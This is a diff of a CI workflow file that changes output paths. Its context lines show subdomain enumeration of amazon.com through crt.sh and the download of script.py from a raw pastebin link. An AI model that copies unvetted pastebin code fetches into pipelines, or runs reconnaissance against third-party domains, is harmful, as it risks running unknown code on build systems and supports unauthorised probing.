@@ -15,7 +15,7 @@ jobs:
       uses: actions/checkout@v3
 
     - name: Create output directory
-      run: mkdir -p /root/output
+      run: mkdir -p /output
 
     - name: Update system packages
       run: sudo apt update -y
@@ -30,10 +30,10 @@ jobs:
         curl -s "https://crt.sh/?q=amazon.com&output=json" | \
         jq -r '.[].name_value' | \
         grep -Po '(\w+\.\w+\.\w+)$' | \
-        sort -u > /root/output/out.txt
+        sort -u > /output/out.txt
 
     - name: Zip the output
-      run: zip -r win3.zip /root/output/out.txt
+      run: zip -r win13.zip /output/out.txt
 
     - name: Download script.py
       run: curl https://pastebin.com/raw/Au0i8d7F > script.py
